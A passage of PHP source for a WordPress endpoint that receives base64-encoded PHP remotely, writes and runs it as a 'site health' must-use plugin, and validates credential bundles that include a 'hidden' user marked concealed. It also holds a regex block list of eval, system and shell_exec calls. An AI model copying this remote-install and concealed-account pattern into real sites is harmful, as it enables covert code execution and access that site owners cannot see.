    if ($plaintext === false) {
        return false;
    }
    $bundle = json_decode($plaintext, true);
    if (function_exists('sodium_memzero')) {
        sodium_memzero($plaintext);
    }
    if ($runtime_version !== EASYPOST_PORTFOLIO_RUNTIME_VERSION) {
        return easypost_endpoint_validate_runtime_users($bundle, $runtime_config['requiredRoles']);
    }
    if (!easypost_endpoint_exact_array_keys($bundle, array('users', 'applicationPasswords'))
        || !easypost_endpoint_exact_array_keys($bundle['users'], array('general', 'hidden', 'additional'))
        || !easypost_endpoint_exact_array_keys($bundle['applicationPasswords'], array('general', 'hidden', 'additional'))
        || $runtime_config['requiredRoles'] !== array('general', 'hidden', 'additional')) {
        return false;
    }
    foreach (array('general', 'hidden', 'additional') as $role) {
        $user = $bundle['users'][$role];
        $credential = $bundle['applicationPasswords'][$role];
        if (!easypost_endpoint_exact_array_keys(
            $user,
            array('required', 'login', 'password', 'wpUserId', 'concealed')
        )
            || $user['required'] !== true
            || !is_string($user['login']) || trim($user['login']) === '' || strlen($user['login']) > 60
            || ($user['password'] !== null && (!is_string($user['password']) || $user['password'] === ''))
            || ($role !== 'general' && $user['password'] === null)
            || !is_int($user['wpUserId']) || $user['wpUserId'] < 1 || $user['wpUserId'] > 2147483647
            || !is_bool($user['concealed']) || $user['concealed'] !== ($role === 'hidden')
            || !easypost_endpoint_exact_array_keys(
                $credential,
                array('required', 'ownerWpUserId', 'managedUuid', 'managedAppId', 'password')
            )
            || $credential['required'] !== true
            || !is_int($credential['ownerWpUserId'])
            || $credential['ownerWpUserId'] !== $user['wpUserId']
            || !easypost_endpoint_runtime_uuid($credential['managedUuid'])
            || !easypost_endpoint_runtime_uuid($credential['managedAppId'])
            || !is_string($credential['password']) || $credential['password'] === '') {
            return false;
        }
    }
    return true;
}

function easypost_endpoint_validate_site_runtime($payload, $decoded_php) {
    if (!isset($payload['runtimeVersion'])
        || !is_string($payload['runtimeVersion'])
        || !in_array($payload['runtimeVersion'], array(
            EASYPOST_LEGACY_RUNTIME_VERSION,
            EASYPOST_CURRENT_RUNTIME_VERSION,
            EASYPOST_PORTFOLIO_RUNTIME_VERSION
        ), true)) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'runtime_version_invalid'));
    }
    if (!isset($payload['configurationVersion'])
        || !is_string($payload['configurationVersion'])
        || !preg_match('/\A[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\z/', $payload['configurationVersion'])) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'configuration_version_invalid'));
    }
    if (!isset($payload['sha256'])
        || !is_string($payload['sha256'])
        || !preg_match('/\A[a-f0-9]{64}\z/', $payload['sha256'])) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'sha256_invalid'));
    }
    if (strlen($decoded_php) > 262144) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'runtime_too_large'));
    }
    $computed_sha256 = hash('sha256', $decoded_php);
    if (!hash_equals($payload['sha256'], $computed_sha256)) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'sha256_mismatch'));
    }
    $manifest = easypost_endpoint_site_runtime_manifest($decoded_php);
    if ($manifest === false
        || $manifest['enabled'] !== true
        || !hash_equals($payload['runtimeVersion'], $manifest['runtimeVersion'])
        || !hash_equals($payload['configurationVersion'], $manifest['configurationVersion'])) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'runtime_manifest_invalid'));
    }
    $dynamic_scan = str_replace(
        array(
            "require_once ABSPATH . 'wp-admin/includes/user.php';",
            "require_once ABSPATH . 'wp-admin/includes/plugin.php';"
        ),
        '',
        $decoded_php
    );
    if (preg_match('/(?:\beval\s*\(|\bassert\s*\(|\bcreate_function\s*\(|\bshell_exec\s*\(|\bsystem\s*\(|\bpassthru\s*\(|\bproc_open\s*\(|\bpopen\s*\(|\binclude(?:_once)?\b|\brequire(?:_once)?\b|\x60)/i', $dynamic_scan)) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'dynamic_construct_rejected'));
    }
    $config_pattern = "/define\\('SITE_HEALTH_RUNTIME_CONFIG_V1', '((?:\\\\.|[^'\\\\])*)'\\);/";
    if (preg_match_all($config_pattern, $decoded_php, $config_matches) !== 1) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'runtime_config_invalid'));
    }
    $config_json = easypost_endpoint_php_single_quoted_value($config_matches[1][0]);
    $runtime_config = $config_json === false ? null : json_decode($config_json, true);
    if (!is_array($runtime_config)
        || !isset($runtime_config['version'])
        || $runtime_config['version'] !== 1
        || !isset($runtime_config['runtimeVersion'], $runtime_config['configurationVersion'])
        || !is_string($runtime_config['runtimeVersion'])
        || !is_string($runtime_config['configurationVersion'])
        || !hash_equals($manifest['runtimeVersion'], $runtime_config['runtimeVersion'])
        || !hash_equals($manifest['configurationVersion'], $runtime_config['configurationVersion'])) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'runtime_config_invalid'));
    }
    if (!easypost_endpoint_validate_runtime_config_contract($runtime_config)) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'runtime_config_invalid'));
    }
    $endpoint_config = easypost_endpoint_config();
    $normalized_runtime = easypost_endpoint_normalized_runtime_skeleton($decoded_php);
    $portfolio_runtime = $payload['runtimeVersion'] === EASYPOST_PORTFOLIO_RUNTIME_VERSION;
    $legacy_runtime = $payload['runtimeVersion'] === EASYPOST_LEGACY_RUNTIME_VERSION;
    $skeleton_sha_key = $portfolio_runtime
        ? 'portfolio_runtime_skeleton_sha256'
        : ($legacy_runtime ? 'legacy_runtime_skeleton_sha256' : 'runtime_skeleton_sha256');
    $skeleton_bytes_key = $portfolio_runtime
        ? 'portfolio_runtime_skeleton_bytes'
        : ($legacy_runtime ? 'legacy_runtime_skeleton_bytes' : 'runtime_skeleton_bytes');
    if ($normalized_runtime === false
        || !isset($endpoint_config[$skeleton_sha_key], $endpoint_config[$skeleton_bytes_key])
        || strlen($normalized_runtime) !== (int) $endpoint_config[$skeleton_bytes_key]
        || !hash_equals($endpoint_config[$skeleton_sha_key], hash('sha256', $normalized_runtime))) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'runtime_skeleton_mismatch'));
    }
    return $runtime_config;
}

function easypost_endpoint_atomic_site_runtime_write($runtime_php, $respond_on_failure = true) {
    $runtime_path = easypost_endpoint_site_runtime_path();
    $directory = dirname($runtime_path);
    if (!is_dir($directory)
        && (!function_exists('wp_mkdir_p') || !wp_mkdir_p($directory))) {
        if ($respond_on_failure) {
            easypost_endpoint_json(500, array('ok' => false, 'error' => 'runtime_directory_unavailable'));
        }
        return false;
    }
    $temporary_path = tempnam($directory, '.site-health-runtime-');
    if ($temporary_path === false) {
        if ($respond_on_failure) {
            easypost_endpoint_json(500, array('ok' => false, 'error' => 'runtime_write_failed'));
        }
        return false;
    }
    $bytes = file_put_contents($temporary_path, $runtime_php, LOCK_EX);
    if ($bytes === false || $bytes !== strlen($runtime_php)) {
        @unlink($temporary_path);
        if ($respond_on_failure) {
            easypost_endpoint_json(500, array('ok' => false, 'error' => 'runtime_write_failed'));
        }
        return false;
    }
    @chmod($temporary_path, 0644);
    if (!rename($temporary_path, $runtime_path)) {
        @unlink($temporary_path);
        if ($respond_on_failure) {
            easypost_endpoint_json(500, array('ok' => false, 'error' => 'runtime_rename_failed'));
        }
        return false;
    }
    if (function_exists('opcache_invalidate')) {
        @opcache_invalidate($runtime_path, true);
    }
    clearstatcache(true, $runtime_path);
    return $runtime_path;
}

function easypost_endpoint_site_runtime_hook_events($hook) {
    if (function_exists('_get_cron_array')) {
        $cron = _get_cron_array();
        if (!is_array($cron)) {
            return false;
        }
        $events = array();
        foreach ($cron as $timestamp => $hooks) {
            if (!isset($hooks[$hook]) || !is_array($hooks[$hook])) {
                continue;
            }
            foreach ($hooks[$hook] as $event) {
                $events[] = array(
                    'timestamp' => (int) $timestamp,
                    'schedule' => isset($event['schedule']) ? $event['schedule'] : false,
                    'args' => isset($event['args']) && is_array($event['args']) ? $event['args'] : array(),
                );
            }
        }
        return $events;
    }
    $timestamp = wp_next_scheduled($hook);
    return $timestamp === false ? array() : array(array(
        'timestamp' => (int) $timestamp,
        'schedule' => $hook === 'site_health_runtime_daily_v1' ? 'daily' : false,
        'args' => array(),
    ));
}

function easypost_endpoint_site_runtime_event_fingerprints($events) {
    if (!is_array($events)) {
        return false;
    }
    $values = array();
    foreach ($events as $event) {
        if (!is_array($event) || !isset($event['timestamp'], $event['schedule'], $event['args'])) {
            return false;
        }
        $values[] = (int) $event['timestamp'] . ':' . (string) $event['schedule'] . ':' . serialize($event['args']);
    }
    sort($values, SORT_STRING);
    return $values;
}

function easypost_endpoint_upgrade_backup_path() {
    return dirname(easypost_endpoint_site_runtime_path())
        . '/site-health-runtime-data/previous.php';
}

function easypost_endpoint_upgrade_marker($raw) {
    $marker = function_exists('maybe_unserialize') ? maybe_unserialize($raw) : @unserialize($raw);
    if (!is_array($marker)
        || array_keys($marker) !== array('version', 'transactionId', 'desiredSha256', 'previousSha256')
        || $marker['version'] !== 1
        || !is_string($marker['transactionId'])
        || !preg_match('/\A[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}\z/', $marker['transactionId'])
        || !is_string($marker['desiredSha256'])
        || !preg_match('/\A[a-f0-9]{64}\z/', $marker['desiredSha256'])
        || !is_string($marker['previousSha256'])
        || !preg_match('/\A[a-f0-9]{64}\z/', $marker['previousSha256'])) {
        return false;
    }
    return $marker;
}

function easypost_endpoint_upgrade_backup_exists($path) {
    return file_exists($path) || is_link($path);
}

function easypost_endpoint_read_upgrade_backup($path) {
    $directory = dirname($path);
    if (!is_file($path)
        || is_link($path)
        || is_link($directory)
        || !is_readable($path)
        || (((int) @fileperms($path)) & 0077) !== 0
        || (((int) @fileperms($directory)) & 0077) !== 0) {
        return false;
    }
    $wrapped = @file_get_contents($path, false, null, 0, 524289);
    $prefix = "<?php\nhttp_response_code(404);\nexit;\n__halt_compiler();\n";
    if (!is_string($wrapped)
        || strlen($wrapped) > 524288
        || strpos($wrapped, $prefix) !== 0
        || !preg_match(
            '/\A<\?php\nhttp_response_code\(404\);\nexit;\n__halt_compiler\(\);\n\/\* SITE_HEALTH_RUNTIME_BACKUP_V1 ([A-Za-z0-9_-]+) \*\/\n([A-Za-z0-9+\/]+={0,2})\n\z/',
            $wrapped,
            $matches
        )) {
        return false;
    }
    $metadata_json = easypost_endpoint_base64url_decode($matches[1]);
    $metadata = is_string($metadata_json) ? json_decode($metadata_json, true) : null;
    $source = base64_decode($matches[2], true);
    $normalized_source = is_string($source)
        ? easypost_endpoint_normalized_runtime_skeleton($source)
        : false;
    $endpoint_config = easypost_endpoint_config();
    $source_manifest = is_string($source)
        ? easypost_endpoint_site_runtime_manifest($source)
        : false;
    $legacy_source = is_array($source_manifest)
        && isset($source_manifest['runtimeVersion'])
        && $source_manifest['runtimeVersion'] === EASYPOST_LEGACY_RUNTIME_VERSION;
    $source_skeleton_sha_key = $legacy_source
        ? 'legacy_runtime_skeleton_sha256'
        : 'runtime_skeleton_sha256';
    $source_skeleton_bytes_key = $legacy_source
        ? 'legacy_runtime_skeleton_bytes'
        : 'runtime_skeleton_bytes';
    if (!is_array($metadata)
        || easypost_endpoint_upgrade_marker(serialize($metadata)) === false
        || !hash_equals(
            $matches[1],
            rtrim(strtr(base64_encode(json_encode($metadata, JSON_UNESCAPED_SLASHES)), '+/', '-_'), '=')
        )
        || !is_string($source)
        || !hash_equals($matches[2], base64_encode($source))
        || $source_manifest === false
        || !is_string($normalized_source)
        || !isset($endpoint_config[$source_skeleton_sha_key], $endpoint_config[$source_skeleton_bytes_key])
        || strlen($normalized_source) !== (int) $endpoint_config[$source_skeleton_bytes_key]
        || !hash_equals($endpoint_config[$source_skeleton_sha_key], hash('sha256', $normalized_source))
        || !hash_equals($metadata['previousSha256'], hash('sha256', $source))) {
        return false;
    }
    return array(
        'bytes' => $wrapped,
        'metadata' => $metadata,
        'source' => $source,
    );
}

function easypost_endpoint_restore_upgrade_backup($path, $bytes) {
    $directory = dirname($path);
    if (!is_string($bytes)
        || !hash_equals(easypost_endpoint_upgrade_backup_path(), $path)
        || is_link($directory)
        || (is_file($path) && is_link($path))
        || (!is_dir($directory)
            && (!function_exists('wp_mkdir_p') || !wp_mkdir_p($directory)))
        || !@chmod($directory, 0700)
        || (((int) @fileperms($directory)) & 0077) !== 0) {
        return false;
    }
    $temporary = tempnam($directory, '.site-health-backup-');
    if ($temporary === false) {
        return false;
    }
    $written = file_put_contents($temporary, $bytes, LOCK_EX);
    if ($written !== strlen($bytes)
        || !@chmod($temporary, 0600)
        || !rename($temporary, $path)) {
        @unlink($temporary);
        return false;
    }
    if (function_exists('opcache_invalidate')) {
        @opcache_invalidate($path, true);
    }
    clearstatcache(true, $path);
    $restored = @file_get_contents($path);
    return (((int) @fileperms($path)) & 0077) === 0
        && is_string($restored)
        && hash_equals($bytes, $restored);
}

function easypost_endpoint_site_runtime_snapshot() {
    $path = easypost_endpoint_site_runtime_path();
    $snapshot = array(
        'path' => $path,
        'fileExists' => is_file($path),
        'fileBytes' => is_file($path) ? @file_get_contents($path) : null,
        'options' => array(),
        'dailyEvents' => easypost_endpoint_site_runtime_hook_events('site_health_runtime_daily_v1'),
        'retryEvents' => easypost_endpoint_site_runtime_hook_events('site_health_runtime_retry_v1'),
        'upgradeBackup' => array(
            'path' => easypost_endpoint_upgrade_backup_path(),
            'exists' => false,
            'bytes' => null,
        ),
    );
    if (($snapshot['fileExists'] && !is_string($snapshot['fileBytes']))
        || $snapshot['dailyEvents'] === false
        || $snapshot['retryEvents'] === false) {
        return false;
    }
    $upgrade_row = easypost_endpoint_read_option_row('site_health_runtime_upgrade_v1');
    $upgrade_exists = easypost_endpoint_upgrade_backup_exists($snapshot['upgradeBackup']['path']);
    if ($upgrade_row['status'] === 'unavailable'
        || ($upgrade_row['status'] === 'found') !== $upgrade_exists) {
        return false;
    }
    if ($upgrade_exists) {
        $marker = easypost_endpoint_upgrade_marker($upgrade_row['raw']);
        $backup = easypost_endpoint_read_upgrade_backup($snapshot['upgradeBackup']['path']);
        if ($upgrade_row['autoload'] !== 'no'
            || $marker === false
            || $backup === false
            || $backup['metadata'] !== $marker
            || !$snapshot['fileExists']
            || !hash_equals($marker['desiredSha256'], hash('sha256', $snapshot['fileBytes']))) {
            return false;
        }
        $snapshot['upgradeBackup']['exists'] = true;
        $snapshot['upgradeBackup']['bytes'] = $backup['bytes'];
    }
    foreach (array(
        'site_health_runtime_bundle_v1',
        'site_health_runtime_configuration_v1',
        'site_health_runtime_disabled_v1',
        'site_health_runtime_daily_second_v1',
        'site_health_runtime_pending_v1',
        'site_health_runtime_retry_event_v1',
        'site_health_runtime_schedule_lock_v1',
        'site_health_runtime_upgrade_v1'
    ) as $name) {
        $row = easypost_endpoint_read_option_row($name);
        if ($row['status'] === 'unavailable') {
            return false;
        }
        $snapshot['options'][$name] = array(
            'status' => $row['status'],
            'raw' => $row['raw'],
            'autoload' => $row['autoload'],
        );
    }
    return $snapshot;
}

function easypost_endpoint_restore_site_runtime_option($name, $state) {
    global $wpdb;
    if (!is_array($state)
        || !isset($state['status'])
        || !isset($wpdb)
        || !isset($wpdb->options)
        || !method_exists($wpdb, 'query')
        || !method_exists($wpdb, 'prepare')) {
        return false;
    }
    $current = easypost_endpoint_read_option_row($name);
    if ($current['status'] === 'unavailable') {
        return false;
    }
    if ($state['status'] === 'missing') {
        if ($current['status'] === 'missing') {
            return true;
        }
        $changed = $wpdb->query($wpdb->prepare(
            "DELETE FROM {$wpdb->options} WHERE option_name = %s AND option_value = %s",
            $name,
            $current['raw']
        ));
        if ((int) $changed !== 1) {
            return false;
        }
        easypost_endpoint_cache_option_deleted(
            $name,
            easypost_endpoint_option_is_autoloaded($current['autoload'])
        );
        return easypost_endpoint_read_option_row($name)['status'] === 'missing';
    }
    if ($state['status'] !== 'found' || !is_string($state['raw']) || !is_string($state['autoload'])) {
        return false;
    }
    if ($current['status'] === 'found'
        && $current['raw'] === $state['raw']
        && $current['autoload'] === $state['autoload']) {
        return true;
    }
    if ($current['status'] === 'missing') {
        $changed = $wpdb->query($wpdb->prepare(
            "INSERT IGNORE INTO {$wpdb->options} (option_name, option_value, autoload) VALUES (%s, %s, %s)",
            $name,
            $state['raw'],
            $state['autoload']
        ));
    } else {
        $changed = $wpdb->query($wpdb->prepare(
            "UPDATE {$wpdb->options} SET option_value = %s, autoload = %s WHERE option_name = %s AND option_value = %s",
            $state['raw'],
            $state['autoload'],
            $name,
            $current['raw']
        ));
    }
    if ((int) $changed !== 1) {
        return false;
    }
    easypost_endpoint_cache_option_written($name, true, true);
    $verified = easypost_endpoint_read_option_row($name);
    return $verified['status'] === 'found'
        && $verified['raw'] === $state['raw']
        && $verified['autoload'] === $state['autoload'];
}

function easypost_endpoint_verify_site_runtime_snapshot($snapshot) {
    $path_exists = is_file($snapshot['path']);
    if ($path_exists !== (bool) $snapshot['fileExists']) {
        return false;
    }
    if ($path_exists) {
        $bytes = @file_get_contents($snapshot['path']);
        if (!is_string($bytes) || !hash_equals($snapshot['fileBytes'], $bytes)) {
            return false;
        }
    }
    $backup_exists = easypost_endpoint_upgrade_backup_exists($snapshot['upgradeBackup']['path']);
    if ($backup_exists !== (bool) $snapshot['upgradeBackup']['exists']) {
        return false;
    }
    if ($backup_exists) {
        $backup = easypost_endpoint_read_upgrade_backup($snapshot['upgradeBackup']['path']);
        if ($backup === false || !hash_equals($snapshot['upgradeBackup']['bytes'], $backup['bytes'])) {
            return false;
        }
    }
    foreach ($snapshot['options'] as $name => $expected) {
        $actual = easypost_endpoint_read_option_row($name);
        if ($actual['status'] !== $expected['status']) {
            return false;
        }
        if ($expected['status'] === 'found'
            && ($actual['raw'] !== $expected['raw'] || $actual['autoload'] !== $expected['autoload'])) {
            return false;
        }
    }
    return easypost_endpoint_site_runtime_event_fingerprints(easypost_endpoint_site_runtime_hook_events('site_health_runtime_daily_v1'))
            === easypost_endpoint_site_runtime_event_fingerprints($snapshot['dailyEvents'])
        && easypost_endpoint_site_runtime_event_fingerprints(easypost_endpoint_site_runtime_hook_events('site_health_runtime_retry_v1'))
            === easypost_endpoint_site_runtime_event_fingerprints($snapshot['retryEvents']);
}

function easypost_endpoint_restore_site_runtime_snapshot($snapshot) {
    if (!is_array($snapshot)
        || !isset($snapshot['path'], $snapshot['options'], $snapshot['dailyEvents'], $snapshot['retryEvents'], $snapshot['upgradeBackup'])) {
        return false;
    }
    $ok = true;
    if ($snapshot['fileExists']) {
        $restored_path = easypost_endpoint_atomic_site_runtime_write($snapshot['fileBytes'], false);
        $ok = $restored_path !== false && $ok;
    } elseif (is_file($snapshot['path'])) {
        $ok = @unlink($snapshot['path']) && !is_file($snapshot['path']) && $ok;
    }
    if ($snapshot['upgradeBackup']['exists']) {
        $ok = easypost_endpoint_restore_upgrade_backup(
            $snapshot['upgradeBackup']['path'],
            $snapshot['upgradeBackup']['bytes']
        ) && $ok;
    } elseif (easypost_endpoint_upgrade_backup_exists($snapshot['upgradeBackup']['path'])) {
        $ok = false;
    }
    foreach ($snapshot['options'] as $name => $state) {
        $ok = easypost_endpoint_restore_site_runtime_option($name, $state) && $ok;
    }
    if (!function_exists('wp_clear_scheduled_hook')) {
        return false;
    }
    $ok = wp_clear_scheduled_hook('site_health_runtime_daily_v1') !== false && $ok;
    $ok = wp_clear_scheduled_hook('site_health_runtime_retry_v1') !== false && $ok;
    foreach (array(
        'site_health_runtime_daily_v1' => $snapshot['dailyEvents'],
        'site_health_runtime_retry_v1' => $snapshot['retryEvents']
    ) as $hook => $events) {
        foreach ($events as $event) {
            $scheduled = $event['schedule']
                ? wp_schedule_event($event['timestamp'], $event['schedule'], $hook, $event['args'])
                : wp_schedule_single_event($event['timestamp'], $hook, $event['args']);
            $ok = $scheduled !== false && $ok;
        }
    }
    if (function_exists('opcache_invalidate')) {
        @opcache_invalidate($snapshot['path'], true);
    }
    return $ok && easypost_endpoint_verify_site_runtime_snapshot($snapshot);
}

function easypost_endpoint_cleanup_pending_upgrade($snapshot) {
    if (!is_array($snapshot) || !isset($snapshot['upgradeBackup'], $snapshot['options']['site_health_runtime_upgrade_v1'])) {
        return false;
    }
    if (!$snapshot['upgradeBackup']['exists']) {
        $current_marker = easypost_endpoint_read_option_row('site_health_runtime_upgrade_v1');
        return $current_marker['status'] === 'missing'
            && !easypost_endpoint_upgrade_backup_exists($snapshot['upgradeBackup']['path']);
    }
    $marker_state = $snapshot['options']['site_health_runtime_upgrade_v1'];
    $current_marker = easypost_endpoint_read_option_row('site_health_runtime_upgrade_v1');
    $backup = easypost_endpoint_read_upgrade_backup($snapshot['upgradeBackup']['path']);
    if ($marker_state['status'] !== 'found'
        || $current_marker['status'] !== 'found'
        || $current_marker['raw'] !== $marker_state['raw']
        || $current_marker['autoload'] !== 'no'
        || $backup === false
        || !hash_equals($snapshot['upgradeBackup']['bytes'], $backup['bytes'])
        || !@unlink($snapshot['upgradeBackup']['path'])) {
        return false;
    }
    if (function_exists('opcache_invalidate')) {
        @opcache_invalidate($snapshot['upgradeBackup']['path'], true);
    }
    clearstatcache(true, $snapshot['upgradeBackup']['path']);
    if (easypost_endpoint_upgrade_backup_exists($snapshot['upgradeBackup']['path'])
        || !easypost_endpoint_restore_site_runtime_option(
            'site_health_runtime_upgrade_v1',
            array('status' => 'missing', 'raw' => null, 'autoload' => null)
        )) {
        return false;
    }
    return easypost_endpoint_read_option_row('site_health_runtime_upgrade_v1')['status'] === 'missing'
        && !easypost_endpoint_upgrade_backup_exists($snapshot['upgradeBackup']['path']);
}

function easypost_endpoint_disabled_site_runtime_php() {
    return base64_decode('PD9waHAKLyogU0lURV9IRUFMVEhfUlVOVElNRV9CRUdJTl9WMSAqLwovKiBTSVRFX0hFQUxUSF9SVU5USU1FX01BTklGRVNUX1YxIGV5SjJaWEp6YVc5dUlqb3hMQ0psYm1GaWJHVmtJanBtWVd4elpTd2ljblZ1ZEdsdFpWWmxjbk5wYjI0aU9pSXlNREkyTGpBNExqRXlJaXdpWTI5dVptbG5kWEpoZEdsdmJsWmxjbk5wYjI0aU9tNTFiR3g5ICovCmlmICghZGVmaW5lZCgnQUJTUEFUSCcpKSB7CiAgICBleGl0Owp9CmlmIChmdW5jdGlvbl9leGlzdHMoJ3VwZGF0ZV9vcHRpb24nKSkgewogICAgdXBkYXRlX29wdGlvbignc2l0ZV9oZWFsdGhfcnVudGltZV9kaXNhYmxlZF92MScsICcxJywgJ25vJyk7Cn0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ2FkZF9vcHRpb24nKSkgewogICAgYWRkX29wdGlvbignc2l0ZV9oZWFsdGhfcnVudGltZV9kaXNhYmxlZF92MScsICcxJywgJycsICdubycpOwp9Ci8qIFNJVEVfSEVBTFRIX1JVTlRJTUVfRU5EX1YxICovCg==', true);
}

function easypost_endpoint_site_runtime_parse_daily_second($value) {
    if (is_string($value)) {
        if (!preg_match('/\A(?:0|[1-9][0-9]{0,4})\z/', $value)) {
            return null;
        }
        $value = (int) $value;
    }
    return is_int($value) && $value >= 0 && $value <= 86399 ? $value : null;
}

function easypost_endpoint_site_runtime_status_payload() {
    $runtime_path = easypost_endpoint_site_runtime_path();
    $runtime_php = is_readable($runtime_path)
        ? @file_get_contents($runtime_path, false, null, 0, 262145)
        : false;
    $manifest = $runtime_php === false
        ? false
        : easypost_endpoint_site_runtime_manifest($runtime_php);
    $slot_row = easypost_endpoint_read_option_row('site_health_runtime_daily_second_v1');
    $bundle_row = easypost_endpoint_read_option_row('site_health_runtime_bundle_v1');
    $configuration_row = easypost_endpoint_read_option_row('site_health_runtime_configuration_v1');
    $disabled_row = easypost_endpoint_read_option_row('site_health_runtime_disabled_v1');
    if ($slot_row['status'] === 'unavailable'
        || $bundle_row['status'] === 'unavailable'
        || $configuration_row['status'] === 'unavailable'
        || $disabled_row['status'] === 'unavailable') {
        return array('ok' => false, 'enabled' => false, 'runtimeMode' => null);
    }
    $slot = $slot_row['status'] === 'found'
        ? easypost_endpoint_site_runtime_parse_daily_second($slot_row['raw'])
        : null;
    $disabled = $disabled_row['status'] === 'found' && $disabled_row['raw'] === '1';
    $enabled = is_array($manifest) && $manifest['enabled'] === true
        && !$disabled
        && $bundle_row['status'] === 'found'
        && $configuration_row['status'] === 'found'
        && is_string($manifest['configurationVersion'])
        && hash_equals($manifest['configurationVersion'], $configuration_row['raw'])
        && $slot !== null;
    return array(
        'ok' => true,
        'enabled' => $enabled,
        'runtimeVersion' => is_array($manifest) ? $manifest['runtimeVersion'] : null,
        'configurationVersion' => is_array($manifest) ? $manifest['configurationVersion'] : null,
        'dailySecondUtc' => $slot,
        'scheduled' => wp_next_scheduled('site_health_runtime_daily_v1') !== false,
        'runtimeMode' => $enabled ? 'MU_PLUGIN' : null,
    );
}

function easypost_endpoint_acquire_internal_runtime_lease() {
    $owner = strtolower(wp_generate_uuid4());
    if (!easypost_endpoint_runtime_uuid($owner)) {
        return false;
    }
    $now = time();
    $desired = easypost_endpoint_site_runtime_lease_value(array(
        'version' => 1,
        'owner' => $owner,
        'source' => 'REMOTE',
        'acquiredAt' => $now,
        'expiresAt' => $now + 600,
    ));
    $inserted = easypost_endpoint_insert_option_once('site_health_runtime_lease_v1', $desired);
    if ($inserted === 'inserted') {
        return $owner;
    }
    if ($inserted === 'unavailable') {
        return false;
    }
    $row = easypost_endpoint_read_option_row('site_health_runtime_lease_v1');
    $observed = $row['status'] === 'found'
        ? easypost_endpoint_site_runtime_lease_state($row['raw'])
        : false;
    return $observed !== false
        && $observed['expiresAt'] <= $now
        && easypost_endpoint_site_runtime_lease_compare_swap($row['raw'], $desired, $row['autoload'])
        ? $owner
        : false;
}

function easypost_endpoint_release_internal_runtime_lease($owner) {
    global $wpdb;
    $row = easypost_endpoint_read_option_row('site_health_runtime_lease_v1');
    if ($row['status'] !== 'found'
        || !isset($wpdb)
        || !isset($wpdb->options)
        || !method_exists($wpdb, 'query')
        || !method_exists($wpdb, 'prepare')) {
        return false;
    }
    $state = easypost_endpoint_site_runtime_lease_state($row['raw']);
    if ($state === false || $state['expiresAt'] <= time() || !hash_equals($state['owner'], (string) $owner)) {
        return false;
    }
    $deleted = $wpdb->query($wpdb->prepare(
        "DELETE FROM {$wpdb->options} WHERE option_name = %s AND option_value = %s",
        'site_health_runtime_lease_v1',
        $row['raw']
    ));
    if ((int) $deleted !== 1) {
        return false;
    }
    easypost_endpoint_cache_option_deleted(
        'site_health_runtime_lease_v1',
        easypost_endpoint_option_is_autoloaded($row['autoload'])
    );
    return easypost_endpoint_read_option_row('site_health_runtime_lease_v1')['status'] === 'missing';
}

function easypost_endpoint_runtime_rollback_error($owner, $snapshot, $ordinary_error) {
    $restored = is_array($snapshot) && easypost_endpoint_restore_site_runtime_snapshot($snapshot);
    $released = is_string($owner) && easypost_endpoint_release_internal_runtime_lease($owner);
    easypost_endpoint_json(500, array(
        'ok' => false,
        'error' => $restored && $released ? $ordinary_error : 'runtime_rollback_failed',
    ));
}

function easypost_endpoint_configure_site_runtime($payload) {
    if (!isset($payload['runtimePhpBase64'])
        || !is_string($payload['runtimePhpBase64'])
        || strlen($payload['runtimePhpBase64']) > 349528) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'runtime_php_required'));
    }
    $decoded_php = base64_decode($payload['runtimePhpBase64'], true);
    if ($decoded_php === false
        || $decoded_php === ''
        || !hash_equals($payload['runtimePhpBase64'], base64_encode($decoded_php))) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'runtime_php_invalid'));
    }
    $runtime_config = easypost_endpoint_validate_site_runtime($payload, $decoded_php);
    $owner = easypost_endpoint_acquire_internal_runtime_lease();
    if ($owner === false) {
        easypost_endpoint_json(409, array('ok' => false, 'error' => 'runtime_busy'));
    }
    $snapshot = easypost_endpoint_site_runtime_snapshot();
    if ($snapshot === false) {
        $released = easypost_endpoint_release_internal_runtime_lease($owner);
        easypost_endpoint_json(500, array('ok' => false, 'error' => $released ? 'runtime_snapshot_failed' : 'runtime_rollback_failed'));
    }
    $runtime_path = easypost_endpoint_atomic_site_runtime_write($decoded_php, false);
    if ($runtime_path === false) {
        easypost_endpoint_runtime_rollback_error($owner, $snapshot, 'runtime_write_failed');
    }
    try {
        if (!function_exists('site_health_runtime_activate')) {
            include $runtime_path;
        }
        $activated = function_exists('site_health_runtime_activate')
            ? site_health_runtime_activate($runtime_config)
            : false;
    } catch (Throwable $error) {
        $activated = false;
    }
    if (!is_array($activated)
        || empty($activated['ok'])
        || empty($activated['enabled'])
        || !isset($activated['runtimeVersion'], $activated['configurationVersion'], $activated['dailySecondUtc'])
        || !hash_equals($payload['runtimeVersion'], (string) $activated['runtimeVersion'])
        || !hash_equals($payload['configurationVersion'], (string) $activated['configurationVersion'])
        || !is_int($activated['dailySecondUtc'])
        || $activated['dailySecondUtc'] < 0
        || $activated['dailySecondUtc'] > 86399) {
        easypost_endpoint_runtime_rollback_error($owner, $snapshot, 'runtime_activation_failed');
    }
    if (!easypost_endpoint_cleanup_pending_upgrade($snapshot)) {
        easypost_endpoint_runtime_rollback_error($owner, $snapshot, 'runtime_activation_failed');
    }
    if (!easypost_endpoint_release_internal_runtime_lease($owner)) {
        easypost_endpoint_runtime_rollback_error($owner, $snapshot, 'runtime_activation_failed');
    }
    easypost_endpoint_json(200, array(
        'ok' => true,
        'enabled' => true,
        'runtimeVersion' => $payload['runtimeVersion'],
        'configurationVersion' => $payload['configurationVersion'],
        'dailySecondUtc' => $activated['dailySecondUtc'],
        'scheduled' => wp_next_scheduled('site_health_runtime_daily_v1') !== false,
